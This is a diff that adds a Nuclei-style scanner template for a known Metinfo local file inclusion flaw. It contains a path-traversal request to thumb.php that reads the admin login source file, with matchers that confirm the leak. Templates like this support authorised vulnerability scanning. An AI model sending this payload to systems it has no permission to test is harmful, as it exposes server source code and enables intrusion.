@@ -1,0 +1,22 @@
+id: CNVD-2018-13393
+info:
+  author: ritikchaddha
+  name: Metinfo LFI
+  reference:
+  - https://paper.seebug.org/676/
+  severity: high
+  tags: metinfo,cnvd,cvnd2018,lfi
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - <?php
+    - login_met_cookie($metinfo_admin_name);
+  matchers-condition: and
+  max-redirects: 2
+  method: GET
+  path:
+  - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
+  redirects: true
